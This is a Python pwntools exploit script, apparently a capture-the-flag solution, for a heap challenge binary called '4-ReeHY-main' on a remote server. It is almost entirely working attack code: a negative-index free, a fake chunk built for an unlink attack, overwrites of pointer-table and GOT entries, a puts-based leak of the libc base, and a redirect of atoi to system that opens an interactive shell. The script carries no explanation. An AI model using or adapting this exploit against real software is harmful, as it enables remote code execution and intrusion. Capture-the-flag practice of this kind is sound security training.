from pwn import *
#p = process("./4-ReeHY-main")
p = remote("111.198.29.45", 46978)
context.log_level = "debug"

elf = ELF("./4-ReeHY-main")
p.recvuntil("$ ")
p.sendline("xxxx")
def create(size,cun,content):
    p.recvuntil("$ ")
    p.sendline("1")
    p.recvuntil("Input size\n")
    p.sendline(str(size))
    p.recvuntil("Input cun\n")
    p.sendline(str(cun))
    p.recvuntil("Input content\n")
    p.sendline(content)

def delete(cun):
    p.recvuntil("$ ")
    p.sendline("2")
    p.recvuntil("Chose one to dele\n")
    p.sendline(str(cun))

def edit(cun,content):
    p.recvuntil("$ ")
    p.sendline("3")
    p.recvuntil("Chose one to edit\n")
    p.sendline(str(cun))
    p.recvuntil("Input the content\n")
    p.send(content)

create(0x80,0,"aa")
create(0x80,1,"aa")
delete(-2)

#fake lenth
payload = p32(0x80*2)+p32(0x80)+p32(0)*2
create(20,2,payload)

#fake chunk to unlink
fd = 0x6020e0 - 0x18
bk = 0x6020e0 - 0x10
payload = p64(0) + p64(0x81)
payload+= p64(fd)+ p64(bk)
payload+= "a"*(0x80-0x20)
payload+= p64(0x80)+p64(0x90)
edit(0,payload)
delete(1)

# modify table
payload = p64(0)*3
payload += p64(elf.got["free"]) + p64(1)#0
payload += p64(elf.got["puts"]) + p64(1)#1
payload += p64(elf.got["atoi"]) + p64(1)#2
edit(0,payload)

# use PLTputs to leak
edit(0,p64(elf.plt["puts"]))
delete(1)
libc = ELF("./libc-2.23.so")
leak = p.recvline()[0:6]
puts_addr = u64(leak + "\x00\x00")
libcbase = puts_addr - libc.symbols["puts"]
system_addr = libcbase + libc.symbols["system"]
print "libcbase:"+hex(libcbase)
print "systeme_addr:"+hex(system_addr)


edit(2,p64(system_addr))
p.sendline("/bin/sh")





p.interactive()

